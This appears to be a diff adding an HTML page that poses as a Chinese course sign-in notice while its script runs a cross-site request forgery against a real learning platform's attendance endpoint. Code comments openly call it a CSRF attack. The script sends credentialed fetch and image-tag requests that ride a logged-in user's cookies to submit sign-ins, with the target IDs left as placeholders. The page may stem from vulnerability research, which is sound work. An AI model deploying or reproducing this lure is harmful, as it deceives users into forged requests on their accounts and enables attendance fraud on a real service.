@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>课程通知</title>
+    <style>
+        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .card h2 { color: #333; margin-bottom: 10px; }
+        .btn { background: #3498db; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 15px; }
+        .btn:hover { background: #2980b9; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>课程签到提醒</h2>
+        <p>您有一个待完成的签到</p>
+        <button class="btn" onclick="doSign()">立即签到</button>
+        <p id="result" style="margin-top:15px;color:#666;font-size:14px"></p>
+    </div>
+
+    <script>
+    function doSign() {
+        document.getElementById('result').innerText = '签到中...';
+
+        // CSRF攻击: 利用已登录用户的cookie发起签到请求
+        // 目标: mobilelearn.chaoxing.com
+        var signUrl = 'https://mobilelearn.chaoxing.com/pptSign/stuSignajax';
+
+        // 方法1: 通过fetch发起CSRF请求
+        fetch(signUrl, {
+            method: 'POST',
+            credentials: 'include',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'activeId=PLACEHOLDER&uid=PLACEHOLDER&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name='
+        })
+        .then(function(r) { return r.text(); })
+        .then(function(t) {
+            console.log('[CSRF Sign] Response:', t);
+            document.getElementById('result').innerHTML =
+                '<span style="color:red">CSRF签到攻击已执行!</span><br>' +
+                '<small>响应: ' + t.replace(/</g, '&lt;') + '</small>';
+        })
+        .catch(function(e) {
+            document.getElementById('result').innerHTML =
+                '<span style="color:orange">请求已发送 (可能被CORS阻止)</span><br>' +
+                '<small>但CSRF漏洞仍然存在 - 服务端无CSRF保护</small>';
+        });
+
+        // 方法2: 通过img标签 (简单GET请求CSRF)
+        var img = new Image();
+        img.src = signUrl + '?activeId=PLACEHOLDER&uid=PLACEHOLDER&clientip=&latitude=-1&longitude=-1&appType=15&fid=0';
+    }
+    </script>
+</body>
+</html>
